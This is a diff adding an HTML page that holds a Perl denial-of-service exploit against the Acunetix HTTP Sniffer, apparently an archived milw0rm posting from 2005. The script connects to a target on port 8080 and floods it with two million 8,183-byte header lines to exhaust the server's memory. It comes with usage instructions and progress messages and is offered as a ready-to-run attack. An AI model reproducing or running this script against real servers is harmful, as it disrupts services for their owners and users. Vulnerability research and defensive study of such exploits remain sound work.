@@ -1,0 +1,69 @@
+<html>
+<head>
+<title>Acunetix HTTP Sniffer Denial of Service Exploit</title>
+<pre>
+#!/usr/bin/perl
+#
+#  Acunetix HTTP Sniffer DOS Exploit
+# ------------------------------------
+#  Infam0us Gr0up - Securiti Research
+#
+#
+# Tested on Windows2000 SP4 (Win NT)
+# Info: infamous.2hell.com
+# Vendor URL: www.acunetix.com
+
+$ARGC=@ARGV;
+if ($ARGC !=2) {
+   print &quot;\n&quot;;
+   print &quot;  Acunetix HTTP Sniffer DOS Exploit\n&quot;;
+   print &quot;-------------------------------------\n\n&quot;;
+   print &quot;Usage: $0 [remote IP] \n&quot;;
+   print &quot;Exam: $0 127.0.0.1\n&quot;;
+   exit;
+}
+
+use IO::Socket::INET;
+
+$host=$ARGV[0];
+$port= &quot;8080&quot;;
+
+print &quot;\n&quot;;
+print &quot;[+] Connect to $host..\n&quot;;
+$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $host,PeerPort =&gt; $port, Proto =&gt; 'tcp')
+|| die &quot;[-] Connection error$@\n&quot;;
+print &quot;[+] Connected\n&quot;;
+sleep(1);
+
+print &quot;[+] Build buffer..\n&quot;;
+sleep(1);
+$hostname=&quot;Host: $host&quot;;
+$bufy='A'x50;
+$bufa='A'x8183;
+$len=length($bufy);
+$buff=&quot;GET / HTTP/1.1\r\n&quot;;
+sleep(1);
+
+print &quot;[+] Sending request..\n&quot;;
+send($sock,$buff,0) || die &quot;[-] send error:$@\n&quot;;
+print &quot;[+] Send DOS..&quot;;
+for($i= 0; $i &lt; 2000000; $i++)
+{
+$buff=&quot; $bufa\r\n&quot;;
+send($sock,$buff,0) || die &quot;send error:$@\n[*] Check if server D0s'ed\n&quot;;
+}
+
+$buff=&quot;$hostname\r\n&quot;;
+$buff.=&quot;Content-Length: $len\r\n&quot;;
+$buff.=&quot;\r\n&quot;;
+$buff.=$bufy.&quot;\r\n\r\n&quot;;
+
+print &quot;[+] Now kill the process..\n&quot;;
+send($sock,$buff,0) || die &quot;[-] send error:$@\n&quot;;
+print &quot;[+] DONE..Server Out of Memory\n&quot;;
+close($sock);
+
+# milw0rm.com [2005-08-05]
+</pre>
+</html>
+
